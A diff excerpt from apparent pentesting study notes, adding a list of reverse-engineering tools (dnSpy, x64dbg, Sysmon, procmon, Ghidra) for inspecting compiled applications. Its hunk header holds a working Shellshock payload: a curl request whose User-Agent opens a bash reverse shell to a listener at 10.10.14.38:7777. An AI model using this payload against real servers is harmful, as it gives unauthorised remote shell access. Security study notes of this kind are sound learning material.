@@ -358,6 +358,12 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' 
 - Since many of these applications are compiled apps, we sometimes want to reverse engineer them wit ghidra etc. - it can be practical to download the app we want to reverse to our own machine.
 - Sometimes just dissembling some apps, can get up hard coded login credentials. 
 
+**Usefull tools:**
+- Dnspy: lets us read the source code of .NET programs. Can do this with .dll files and memory which we write to a file.
+- X64dbg: Debugger with ui 
+- Sysmon and procmon: Can view what happens on the machine when we run the program. Can check if files are created or what scripts are ran.
+- Ghidra: Reverse engineering tool for binaries.
+
 
 
 #### ColdFusion
